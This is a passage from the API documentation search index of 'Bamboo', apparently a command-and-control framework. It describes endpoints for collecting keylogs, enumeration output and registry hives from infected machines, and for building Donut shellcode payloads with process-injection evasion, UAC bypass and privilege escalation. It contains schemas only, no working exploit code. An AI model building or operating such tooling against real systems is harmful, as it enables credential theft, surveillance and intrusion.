schema","text":""},{"location":"API_Reference/agent.html#request-body_3","title":"Request body","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent status String State of agent: <code>done</code>, <code>start</code>, <code>error</code> keystroke String Key strokes recorded handler String Bamboo Client user that started the keylogging error String If status is error, will state error"},{"location":"API_Reference/agent.html#request-example_3","title":"Request example","text":"<pre><code>{\n    \"agent_identifier\": \"5zrire9a\",\n    \"status\": \"done\":,\n    \"keystroke\": \"keystrokesrecorded\",\n    \"handler\": \"Bamboo User A\",\n    \"error\": \"\"\n}\n</code></pre>"},{"location":"API_Reference/agent.html#response-schema_4","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"message\": \"success\"} Successfully sent broadcasted to Bamboo Client <code>400</code> {\"message\": \"failed\"} Failed to broadcast to Bamboo Client <code>404</code> {\"message\": \"error\"} There was an error when logging keystrokes"},{"location":"API_Reference/agent.html#response-example_3","title":"Response example","text":"<pre><code>{\n    \"message\": \"success\"\n}\n</code></pre>"},{"location":"API_Reference/agent.html#websocket-schema","title":"WebSocket schema","text":""},{"location":"API_Reference/agent.html#websocket-body","title":"WebSocket body","text":"Field Type Description keylogMsg String Keystrokes recorded agent_identifier String Identifier of Bamboo Agent"},{"location":"API_Reference/agent.html#websocket-example","title":"WebSocket example","text":"<pre><code>{\n    \"keylogMsg\": \"keystrokesrecorded\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"API_Reference/agent.html#enumerate-result","title":"Enumerate Result","text":"<p>Store enumeration (<code>enum</code>) result</p>"},{"location":"API_Reference/agent.html#endpoint_5","title":"Endpoint","text":"<pre><code>POST /agent/post_exploit/enumerate\n</code></pre>"},{"location":"API_Reference/agent.html#description_5","title":"Description","text":"<p>Enumerate Result will be called by Bamboo Agent when Bamboo Client command the Bamboo Agent to enumerate the infected machine. There will be error checking to determine if there were any error, if there are no errors, Bamboo Teamserver will send the enumerate results to the user via WebSocket.</p>"},{"location":"API_Reference/agent.html#request-schema_4","title":"Request schema","text":""},{"location":"API_Reference/agent.html#request-body_4","title":"Request body","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent status String State of agent: <code>done</code>, <code>error</code> result String Enumerate Result handler String Bamboo Client user that started the keylogging error String If status is error, will state error"},{"location":"API_Reference/agent.html#request-example_4","title":"Request example","text":"<pre><code>{\n    \"agent_identifier\": \"5zrire9a\",\n    \"status\": \"done\":,\n    \"result\": &lt;a very long list of string&gt;,\n    \"handler\": \"Bamboo User A\",\n    \"error\": \"\"\n}\n</code></pre>"},{"location":"API_Reference/agent.html#response-schema_5","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"message\": \"success\"} Successfully sent broadcasted to Bamboo Client <code>400</code> {\"message\": \"failed\"} Failed to broadcast to Bamboo Client <code>404</code> {\"message\": \"error\"} There was an error when enumerating"},{"location":"API_Reference/agent.html#response-example_4","title":"Response example","text":"<pre><code>{\n    \"message\": \"success\"\n}\n</code></pre>"},{"location":"API_Reference/agent.html#websocket-schema_1","title":"WebSocket schema","text":""},{"location":"API_Reference/agent.html#websocket-body_1","title":"WebSocket body","text":"Field Type Description enumerateMsg String Enumerated result agent_identifier String Identifier of Bamboo Agent"},{"location":"API_Reference/agent.html#websocket-example_1","title":"WebSocket example","text":"<pre><code>{\n    \"enumerateMsg\": &lt;a very long list of string&gt;,\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"API_Reference/agent.html#sss_retrieve-result","title":"SSS_Retrieve Result","text":"<p>Store SSS_Retrieve (<code>retrieve</code>) result</p>"},{"location":"API_Reference/agent.html#endpoint_6","title":"Endpoint","text":"<pre><code>POST /agent/post_exploit/sss_retrieve\n</code></pre>"},{"location":"API_Reference/agent.html#description_6","title":"Description","text":"<p>SSS_Retrieve Result will be called by Bamboo Agent when Bamboo Client command the Bamboo Agent to Retrieve registry hives from the infected machine. There will be error checking to determine if there were any error, if there are no errors, Bamboo Teamserver will send the retrieved results to the user via WebSocket.</p>"},{"location":"API_Reference/agent.html#request-schema_5","title":"Request schema","text":""},{"location":"API_Reference/agent.html#request-body_5","title":"Request body","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent status String State of agent: <code>done</code>, <code>error</code> files String Dictionary of binary handler String Bamboo Client user that started the keylogging error String If status is error, will state error"},{"location":"API_Reference/agent.html#request-example_5","title":"Request example","text":"<pre><code>{\n    \"agent_identifier\": \"5zrire9a\",\n    \"status\": \"done\":,\n    \"result\": &lt;dictionary of binary&gt;,\n    \"handler\": \"Bamboo User A\",\n    \"error\": \"\"\n}\n</code></pre>"},{"location":"API_Reference/agent.html#response-schema_6","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"message\": \"success\"} Successfully sent broadcasted to Bamboo Client <code>400</code> {\"message\": \"failed\"} Failed to broadcast to Bamboo Client <code>404</code> {\"message\": \"error\"} There was an error when enumerating"},{"location":"API_Reference/agent.html#response-example_5","title":"Response example","text":"<pre><code>{\n    \"message\": \"success\"\n}\n</code></pre>"},{"location":"API_Reference/agent.html#websocket-schema_2","title":"WebSocket schema","text":""},{"location":"API_Reference/agent.html#websocket-body_2","title":"WebSocket body","text":"Field Type Description retrieveMsg String Enumerated result agent_identifier String Identifier of Bamboo Agent"},{"location":"API_Reference/agent.html#websocket-example_2","title":"WebSocket example","text":"<pre><code>{\n    \"retrieveMsg\": &lt;dictionary of binary&gt;,\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"API_Reference/authentication.html","title":"/auth","text":""},{"location":"API_Reference/authentication.html#server-status","title":"Server Status","text":"<p>Check if server is up</p>"},{"location":"API_Reference/authentication.html#endpoint","title":"Endpoint","text":"<pre><code>POST /auth/\n</code></pre>"},{"location":"API_Reference/authentication.html#description","title":"Description","text":"<p>Bamboo Client will always request for this endpoint before requesting for credentials. A simple endpoint that allows Bamboo Client to determine if the Bamboo Teamserver hosted in the address input is online.</p>"},{"location":"API_Reference/authentication.html#response-schema","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"online\"} Server is online"},{"location":"API_Reference/authentication.html#response-example","title":"Response example","text":"<pre><code>{\n    \"status\": \"online\"\n}\n</code></pre>"},{"location":"API_Reference/authentication.html#user-login","title":"User Login","text":"<p>Authenticates user credentials for access</p>"},{"location":"API_Reference/authentication.html#endpoint_1","title":"Endpoint","text":"<pre><code>POST /auth/login\n</code></pre>"},{"location":"API_Reference/authentication.html#description_1","title":"Description","text":"<p>This endpoint validates the credential sent by the user from Bamboo Client. Using the <code>model login_auth</code>, Bamboo Teamserver will determine if the credentials are valid. If it is valid, Bamboo Teamserver will generate a JSON Web Token (JWT) for the Bamboo Client user and respond back to the user.</p>"},{"location":"API_Reference/authentication.html#request-schema","title":"Request schema","text":""},{"location":"API_Reference/authentication.html#request-body","title":"Request body","text":"Field Type Description username String Username input by user password String Password input by user"},{"location":"API_Reference/authentication.html#request-example","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"password\": \"adnap\"\n}\n</code></pre>"},{"location":"API_Reference/authentication.html#response-schema_1","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"message\": \"Login successful\", \"jwt_token\": jwt_token} Successfully Login <code>400</code> {\"status\": \"error\", \"message\": \"User not found\"} Invalid Username <code>401</code> {\"status\": \"error\", \"message\": \"Incorrect password\"} Incorrect Password <code>404</code> {\"status\": \"error\", \"message\": \"Something went wrong!\"} Invalid Body"},{"location":"API_Reference/authentication.html#response-example_1","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"message\": \"Login successful\",\n    \"jwt_token\": jwt_token\n}\n</code></pre>"},{"location":"API_Reference/authentication.html#user-logout","title":"User Logout","text":"<p>Notifies Bamboo Teamserver that user have log out</p>"},{"location":"API_Reference/authentication.html#endpoint_2","title":"Endpoint","text":"<pre><code>POST /auth/logout\n</code></pre>"},{"location":"API_Reference/authentication.html#description_2","title":"Description","text":"<p>This endpoint is called when the Bamboo Client user want to log off using <code>exit</code>/<code>quit</code> command. Bamboo Teamserver will update the user status in the database using the <code>model users</code> and will generate a log. Bamboo Teamserver will also remove the username from the WebSocket Client dictionary.</p>"},{"location":"API_Reference/authentication.html#request-schema_1","title":"Request schema","text":""},{"location":"API_Reference/authentication.html#request-body_1","title":"Request body","text":"Field Type Description username String Username of user"},{"location":"API_Reference/authentication.html#request-example_1","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\"\n}\n</code></pre>"},{"location":"API_Reference/authentication.html#response-schema_2","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"message\": \"logout\"} Successfully Logout <code>404</code> {\"message\": \"failed\"} Invalid Body"},{"location":"API_Reference/authentication.html#response-example_2","title":"Response example","text":"<pre><code>{\n    \"message\": \"logout\"\n}\n</code></pre>"},{"location":"API_Reference/authentication.html#check-agent-status","title":"Check Agent Status","text":"<p>Determing agent status and return back to Bamboo Client</p>"},{"location":"API_Reference/authentication.html#endpoint_3","title":"Endpoint","text":"<pre><code>POST /auth/check_agent_status\n</code></pre>"},{"location":"API_Reference/authentication.html#description_3","title":"Description","text":"<p>When Bamboo Client user uses commands such as {<code>exploit</code> and <code>cmd</code>}, Bamboo Client will need to determine if the Bamboo Agent in use is online. This endpoint uses the <code>model obtain_status</code> and will return the status of the specific Bamboo Agent.</p>"},{"location":"API_Reference/authentication.html#request-schema_2","title":"Request schema","text":""},{"location":"API_Reference/authentication.html#request-body_2","title":"Request body","text":"Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"API_Reference/authentication.html#request-example_2","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"API_Reference/authentication.html#response-schema_3","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"agent_status\": agent_status} Successfully Logout <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"API_Reference/authentication.html#response-example_3","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"agent_status\": \"online\"\n}\n</code></pre>"},{"location":"API_Reference/exploit.html","title":"/exploit","text":""},{"location":"API_Reference/exploit.html#stop-exploit","title":"Stop Exploit","text":"<p>Stop exploit process. For logging purposes</p>"},{"location":"API_Reference/exploit.html#endpoint","title":"Endpoint","text":"<pre><code>POST /exploit/quit\n</code></pre>"},{"location":"API_Reference/exploit.html#description","title":"Description","text":"<p>When a Bamboo Client user wants to stop the process of exploiting a Bamboo Agent, Bamboo Client will call this endpoint to notify Bamboo Teamserver about it, for logging purposes.</p>"},{"location":"API_Reference/exploit.html#request-schema","title":"Request schema","text":""},{"location":"API_Reference/exploit.html#request-body","title":"Request body","text":"Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"API_Reference/exploit.html#request-example","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"API_Reference/exploit.html#response-schema","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"stopped\"} Successfully notified <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"API_Reference/exploit.html#response-example","title":"Response example","text":"<pre><code>{\n    \"status\": \"stopped\"\n}\n</code></pre>"},{"location":"API_Reference/exploit.html#exploit-agent","title":"Exploit Agent","text":"<p>Handles configuration sent from Bamboo Client to produce a valid payload to Bamboo Agent</p>"},{"location":"API_Reference/exploit.html#endpoint_1","title":"Endpoint","text":"<pre><code>POST /exploit/send_config\n</code></pre>"},{"location":"API_Reference/exploit.html#description_1","title":"Description","text":"<p>Exploit Agent is called after a Bamboo Client user finish configuring the exploit to use on the Bamboo Agent. Bamboo Teamserver will first convert the selected evasion method into a standardised one. Next, it will perform a sequence of logic which can be seen in the flowchart below. If Donut is required, Bamboo Teamserver will run the Donut function with the given Donut configuration input by the user. The Donut function will turn the exploit into shellcode before converting the shellcode into hexadecimals. Finally, Bamboo Teamserver will broadcast a WebSocket message to the Bamboo Agent using its agent identifier to give it its command.</p> <p></p>"},{"location":"API_Reference/exploit.html#request-schema_1","title":"Request schema","text":""},{"location":"API_Reference/exploit.html#request-body_1","title":"Request body","text":"Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent need_donut Boolean Determines if Donut is required exploit_to_use String Exploit name evasion_method String Evasion method choosen app_version String Version of is affected by exploit uac_bypass Boolean Determines if payload require uac_bypass donut_config_data List of Integers Donut configurations (if applicable) file2donut String File name to generate shellcode using Donut (if applicable)"},{"location":"API_Reference/exploit.html#request-example_1","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\",\n    \"need_donut\": True,\n    \"exploit_to_use\": \"filmora.exe\",\n    \"evasion_method\": \"Process Injection [Injection]\",\n    \"app_version\": \"Wondershare Filmora v11\",\n    \"uac_bypass\": True,\n    \"donut_config_data\": [3, 2, 1, 2],\n    \"file2donut\": \"uac_bypass.exe\"\n}\n</code></pre>"},{"location":"API_Reference/exploit.html#response-schema_1","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully notified <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"failed\"} Invalid Body <code>500</code> {\"status\": \"failed\"} Something went wrong"},{"location":"API_Reference/exploit.html#response-example_1","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"API_Reference/exploit.html#websocket-schema","title":"WebSocket schema","text":""},{"location":"API_Reference/exploit.html#websocket-body","title":"WebSocket body","text":"Field Type Description app_version String App version that exploit targets command String exploit method String Evasion method for uac_bypass/exploit shellcode String Hexadecimal of exploit file drop_file String File to download from Bamboo Teamserver uac_bypass String If uac_bypass is needed, will contain evasion method. Else an empty string"},{"location":"API_Reference/exploit.html#websocket-example","title":"WebSocket example","text":"<pre><code>{\n    \"app_version\": \"Bamboooo\",\n    \"command\": \"exploit\",\n    \"method\": \"Gadget Injection\",\n    \"shellcode\": &lt;Exploit shellcode in Hexadecimal&gt;,\n    \"drop_file\": \"\",\n    \"uac_bypass\": \"\"\n}\n</code></pre>"},{"location":"API_Reference/exploit.html#view-exploits","title":"View Exploits","text":"<p>View all exploits</p>"},{"location":"API_Reference/exploit.html#endpoint_2","title":"Endpoint","text":"<pre><code>POST /exploit/view_all\n</code></pre>"},{"location":"API_Reference/exploit.html#description_2","title":"Description","text":"<p>When Bamboo Client uses the {command <code>exp</code>}, Bamboo Teamserver will gather all exploits in the database using the <code>model view_all</code> and returns it back to Bamboo Client.</p>"},{"location":"API_Reference/exploit.html#request-schema_2","title":"Request schema","text":""},{"location":"API_Reference/exploit.html#request-body_2","title":"Request body","text":"Field Type Description username String Username of user"},{"location":"API_Reference/exploit.html#request-example_2","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n}\n</code></pre>"},{"location":"API_Reference/exploit.html#response-schema_2","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"exploit_data\": exploit_data} Successful and there are exploits <code>200</code> {\"status\": \"failed\", \"exploit_data\": exploit_data} Successful but no exploits <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"API_Reference/exploit.html#response-example_2","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"exploit_data\": &lt;dictionary of exploit data&gt;\n}\n</code></pre>"},{"location":"API_Reference/exploit.html#add-exploits","title":"Add Exploits","text":"<p>Add new exploit</p>"},{"location":"API_Reference/exploit.html#endpoint_3","title":"Endpoint","text":"<pre><code>POST /exploit/add\n</code></pre>"},{"location":"API_Reference/exploit.html#description_3","title":"Description","text":"<p>When Bamboo Client uses the {command <code>add</code>}, Bamboo Teamserver will upload the new exploit information into the database using the <code>model add_exploit</code>. Additionally, using <code>request.files</code>, Bamboo Teamserver will place the exploit file into /exploit folder.</p>"},{"location":"API_Reference/exploit.html#request-schema_3","title":"Request schema","text":""},{"location":"API_Reference/exploit.html#request-body_3","title":"Request body","text":"Field Type Description username String Username of user configurations List Contains information of new exploit files Bytes Bytes of new exploit file (not sent in request body)"},{"location":"API_Reference/exploit.html#request-example_3","title":"Request example","text":""},{"location":"API_Reference/exploit.html#request-body_4","title":"Request Body","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"configurations\": [\"newExploit.exe\", \"app_version_Bamboo\", \"user\", \"system\", False, True, True, \"\"]\n}\n</code></pre>"},{"location":"API_Reference/exploit.html#multipartform-data","title":"multipart/form-data","text":"<pre><code>{\n    \"file\": &lt;file bytes&gt;\n}\n</code></pre>"},{"location":"API_Reference/exploit.html#response-schema_3","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully added new exploit <code>404</code> {\"status\": \"failed\"} Invalid Body <code>500</code> {\"staus\": \"failed\"} Failed to add into database <code>500</code> {\"status\": \"failed\"} Something went wrong"},{"location":"API_Reference/exploit.html#response-example_3","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"API_Reference/exploit.html#delete-exploits","title":"Delete Exploits","text":"<p>Delete a exploit</p>"},{"location":"API_Reference/exploit.html#endpoint_4","title":"Endpoint","text":"<pre><code>POST /exploit/delete\n</code></pre>"},{"location":"API_Reference/exploit.html#description_4","title":"Description","text":"<p>When Bamboo Client uses the {command: <code>delete</code>}, Bamboo Teamserver will attempt to remove the exploit specified by the Bamboo Client user using the <code>model del_exploit</code>. Bamboo Teamserver will remove the information related to the exploit stored in the database, as well as the file stored in Bamboo Teamserver under the /exploits folder.</p>"},{"location":"API_Reference/exploit.html#request-schema_4","title":"Request schema","text":""},{"location":"API_Reference/exploit.html#request-body_5","title":"Request body","text":"Field Type Description username String Username of user exploit_name String Name of exploit to delete"},{"location":"API_Reference/exploit.html#request-example_4","title":"Request example","text":""},{"location":"API_Reference/exploit.html#request-body_6","title":"Request Body","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"exploit_name\": \"filmora.exe\"\n}\n</code></pre>"},{"location":"API_Reference/exploit.html#response-schema_4","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully deleted specified exploit <code>200</code> {\"staus\": \"does not exist\"} No such exploit exist in the database <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"API_Reference/exploit.html#response-example_4","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"API_Reference/exploit.html#exploit-existence","title":"Exploit Existence","text":"<p>Determine if an exploit exist in Bamboo Teamserver</p>"},{"location":"API_Reference/exploit.html#endpoint_5","title":"Endpoint","text":"<pre><code>POST /exploit/exist\n</code></pre>"},{"location":"API_Reference/exploit.html#description_5","title":"Description","text":"<p>Exploit Existence is used for when the {command <code>modify</code>} is called in the Bamboo Client. This endpoint will help determine if a exploit exist in Bamboo Teamserver and return the exploit information if it exist before allowing the Bamboo Client users to start making changes. It uses the <code>model find_one</code> to locate the specified exploit.</p>"},{"location":"API_Reference/exploit.html#request-schema_5","title":"Request schema","text":""},{"location":"API_Reference/exploit.html#request-body_7","title":"Request body","text":"Field Type Description username String Username of user exploit_name String Name of exploit to delete"},{"location":"API_Reference/exploit.html#request-example_5","title":"Request example","text":""},{"location":"API_Reference/exploit.html#request-body_8","title":"Request Body","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"exploit_name\": \"filmora.exe\"\n}\n</code></pre>"},{"location":"API_Reference/exploit.html#response-schema_5","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"data\": data} Found the exploit in the database <code>200</code> {\"staus\": \"does not exist\"} No such exploit exist in the database <code>404</code> {\"status\": \"failed\"} Invalid Body"},{"location":"API_Reference/exploit.html#response-example_5","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"data\": data\n}\n</code></pre>"},{"location":"API_Reference/exploit.html#modify-exploit-cli","title":"Modify Exploit (CLI)","text":"<p>Modifies exploit specified</p>"},{"location":"API_Reference/exploit.html#endpoint_6","title":"Endpoint","text":"<pre><code>POST /exploit/modify\n</code></pre>"},{"location":"API_Reference/exploit.html#description_6","title":"Description","text":"<p>Modify Exploit is called when CLI Bamboo Client calls the {<code>modify</code> command}. The Bamboo Client will sent the set of changes to be made, which can vary in sizes and key depending on what needs to be modified. If the exploit name is to be modified, Bamboo Teamserver will change the exploit file name accordingly. Using the <code>model modify</code>, Bamboo Teamserver will be able to make dynamic changes to the information of the exploit stored in the database.</p>"},{"location":"API_Reference/exploit.html#request-schema_6","title":"Request schema","text":""},{"location":"API_Reference/exploit.html#request-body_9","title":"Request body","text":"Field Type Description username String Username of user exploit_name String Name of exploit to modify changes Dictionary Dictionary of changes to be made (dynamic)"},{"location":"API_Reference/exploit.html#request-example_6","title":"Request example","text":""},{"location":"API_Reference/exploit.html#request-body_10","title":"Request Body","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"exploit_name\": \"filmora.exe\"\n    \"changes\": {\n        \"name\": \"new_name.exe\", \n        \"app_version\": \"new_app_version\"\n    }\n}\n</code></pre>"},{"location":"API_Reference/exploit.html#response-schema_6","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully modified specified exploit <code>404</code> {\"status\": \"failed\"} Invalid Body <code>500</code> {\"staus\": \"failed\"} Something went wrong"},{"location":"API_Reference/exploit.html#response-example_6","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"API_Reference/exploit.html#modify-exploit-gui","title":"Modify Exploit (GUI)","text":"<p>Modifies exploit specified</p>"},{"location":"API_Reference/exploit.html#endpoint_7","title":"Endpoint","text":"<pre><code>POST /exploit/modify_gui\n</code></pre>"},{"location":"API_Reference/exploit.html#description_7","title":"Description","text":"<p>Modify Exploit is called when GUI Bamboo Client calls the {<code>modify</code> command}. As Bamboo Client GUI will push all information to Bamboo Teamserver no matter if they were modified, a new endpoint was created to cater to it. Similar to the previous Endpoint, if the name of the exploit to be modified changes its name, the exploit file name will change as well. Using the <code>model modify_gui</code>, Bamboo Teamserver will be able to update the information of the exploit all together.</p>"},{"location":"API_Reference/exploit.html#request-schema_7","title":"Request schema","text":""},{"location":"API_Reference/exploit.html#request-body_11","title":"Request body","text":"Field Type Description username String Username of user modified_exploit_name String Name of exploit to modify new_name String New exploit name new_app_version String New app version new_LPE_start String New Privilege Escalation Start new_LPE_end String New Privilege Escalation End new_uac_bypass Boolean New uac_bypass requirement new_d2d Boolean New drop-to-disk requirement new_inj Boolean New injection requirement new_dropfile Boolean New dropfile requirement"},{"location":"API_Reference/exploit.html#request-example_7","title":"Request example","text":""},{"location":"API_Reference/exploit.html#request-body_12","title":"Request Body","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"modified_exploit_name\": \"filmora.exe\"\n    \"new_name\": \"Pandaaa.exe\",\n    \"modified_exploit_name\": \"for pandas\",\n    \"new_LPE_start\": \"admin\",\n    \"new_LPE_end\": \"system\",\n    \"new_uac_bypass\": True,\n    \"new_d2d\": True,\n    \"new_inj\": True,\n    \"new_dropfile\" \"Pandaaa.exe\"\n}\n</code></pre>"},{"location":"API_Reference/exploit.html#response-schema_7","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Successfully modified specified exploit <code>404</code> {\"status\": \"failed\"} Invalid Body <code>500</code> {\"staus\": \"failed\"} Something went wrong"},{"location":"API_Reference/exploit.html#response-example_7","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html","title":"/handler_func","text":""},{"location":"API_Reference/handler_func.html#display-agents","title":"Display Agents","text":"<p>Extract all Bamboo Agent information from database</p>"},{"location":"API_Reference/handler_func.html#endpoint","title":"Endpoint","text":"<pre><code>POST /handler_func/agent/display\n</code></pre>"},{"location":"API_Reference/handler_func.html#description","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to view all current Bamboo Agents registered in Bamboo Teamserver using the {command <code>display</code>}. Using the <code>model show_agents</code> and <code>model get_heartbeat</code>, Bamboo Teamserver will be able to extract all register Bamboo Agents information and status from the database.</p>"},{"location":"API_Reference/handler_func.html#request-schema","title":"Request schema","text":""},{"location":"API_Reference/handler_func.html#request-body","title":"Request body","text":"Field Type Description username String Username of user"},{"location":"API_Reference/handler_func.html#request-example","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\"\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#response-schema","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"agent\": agent, \"heartbeat\": heartbeat} Success <code>404</code> {\"status\": \"failed\"} Invalid Body <code>500</code> {\"status\": \"failed\"} Something went wrong"},{"location":"API_Reference/handler_func.html#response-example","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"agent\": &lt;list of agent information&gt;,\n    \"heartbeat\": &lt;list of agent's heartbeat information&gt;\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#using-agents","title":"Using Agents","text":"<p>Extract specified agent information</p>"},{"location":"API_Reference/handler_func.html#endpoint_1","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/use_agent\n</code></pre>"},{"location":"API_Reference/handler_func.html#description_1","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to start using a Bamboo Agent to interact with using the {command <code>use [agent]</code>}. Using the <code>model use_agent</code>, Bamboo Teamserver will be able to identify if the Bamboo Agent specified exist. If it does, the data of that Bamboo Agent will be return.</p>"},{"location":"API_Reference/handler_func.html#request-schema_1","title":"Request schema","text":""},{"location":"API_Reference/handler_func.html#request-body_1","title":"Request body","text":"Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"API_Reference/handler_func.html#request-example_1","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#response-schema_1","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"agent_data\": agent_data} Success <code>404</code> {\"status\": \"failed\"} Invalid Body <code>500</code> {\"status\": \"failed\"} Something went wrong"},{"location":"API_Reference/handler_func.html#response-example_1","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"agent_data\": &lt;list of specified Bamboo Agent data&gt;\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#stop-using-agents","title":"Stop Using Agents","text":"<p>Stop using agents, for logging purposes</p>"},{"location":"API_Reference/handler_func.html#endpoint_2","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/stop_agent\n</code></pre>"},{"location":"API_Reference/handler_func.html#description_2","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to stop using a Bamboo Agent using the {command <code>stop</code>}. It is for logging purposes</p>"},{"location":"API_Reference/handler_func.html#request-schema_2","title":"Request schema","text":""},{"location":"API_Reference/handler_func.html#request-body_2","title":"Request body","text":"Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"API_Reference/handler_func.html#request-example_2","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#response-schema_2","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"message\": \"stop\"} Success <code>404</code> {\"message\": \"failed\"} Invalid Body"},{"location":"API_Reference/handler_func.html#response-example_2","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"agent_data\": &lt;list of specified Bamboo Agent data&gt;\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#remove-agent","title":"Remove Agent","text":"<p>Remove specified Bamboo Agent</p>"},{"location":"API_Reference/handler_func.html#endpoint_3","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/remove_agent\n</code></pre>"},{"location":"API_Reference/handler_func.html#description_3","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to remove a Bamboo Agent from Bamboo Teamserver using the {command <code>delete [agent]</code>}. Using the <code>model remove_agent</code>, Bamboo Teamserver will delete all instances of the specified Bamboo Agent if it exist. Additionally, if the Bamboo Agent is still running, Bamboo Teamserver will send a <code>kill</code> command to stop the Bamboo Agent.</p>"},{"location":"API_Reference/handler_func.html#request-schema_3","title":"Request schema","text":""},{"location":"API_Reference/handler_func.html#request-body_3","title":"Request body","text":"Field Type Description username String Username of user agent_identifier String Identifier of Bamboo Agent"},{"location":"API_Reference/handler_func.html#request-example_3","title":"Request example","text":"<pre><code>{\n    \"username\": \"bambooUser\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#response-schema_3","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\"} Success <code>400</code> {\"status\": \"Agent is not connected to C2 WS\"} Failed to broadcast to Bamboo Agent <code>404</code> {\"status\": \"fail\"} Invalid Body <code>500</code> {\"status\": \"fail\"} Something went wrong"},{"location":"API_Reference/handler_func.html#response-example_3","title":"Response example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"API_Reference/handler_func.html#agent-information","title":"Agent Information","text":"<p>Retrieve a specific Bamboo Agent information</p>"},{"location":"API_Reference/handler_func.html#endpoint_4","title":"Endpoint","text":"<pre><code>POST /handler_func/handler/info_status\n</code></pre>"},{"location":"API_Reference/handler_func.html#description_4","title":"Description","text":"<p>This endpoint is called when a Bamboo Client user wants to the Bamboo Agent in use information using the {command <code>info</code>}. Using the <code>model info_status</code>, Bamboo Teamserver will be able to extract the information of the requested Bamboo 